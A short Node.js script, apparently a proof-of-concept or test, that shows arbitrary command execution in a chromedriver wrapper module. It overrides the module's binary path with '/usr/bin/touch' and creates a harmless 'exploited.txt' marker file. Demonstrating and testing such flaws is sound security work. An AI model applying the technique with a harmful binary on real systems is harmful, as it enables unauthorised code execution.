'use strict'

const chromedriver = require('../src');
chromedriver.path = '/usr/bin/touch';
chromedriver.start(['exploited.txt'], false);